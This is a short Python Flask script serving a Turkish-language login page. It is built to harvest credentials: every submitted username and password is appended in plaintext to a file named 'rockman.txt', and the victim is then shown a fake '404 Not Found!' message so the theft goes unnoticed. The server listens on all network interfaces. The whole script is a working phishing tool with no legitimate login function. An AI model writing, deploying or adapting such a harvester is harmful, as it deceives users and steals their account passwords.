from flask import Flask, request, render_template_string

app = Flask(__name__)

HOME_PAGE = '''
<html>
    <head><title>Giriş Formu</title></head>
    <body>
        <h2>Giriş Yap</h2>
        <form action="/login" method="POST">
            <input type="text" name="username" placeholder="Kullanıcı Adı" required>
            <input type="password" name="password" placeholder="Şifre" required>
            <button type="submit">Giriş</button>
        </form>
    </body>
</html>
'''

@app.route('/')
def home():
    return render_template_string(HOME_PAGE)

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username')
    password = request.form.get('password')
    # Kullanıcı giriş bilgilerini dosyaya kaydeder
    with open('rockman.txt', 'a') as file:
        file.write(f'Kullanıcı Adı: {username}, Şifre: {password}\n')
    return '404 Not Found!'

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)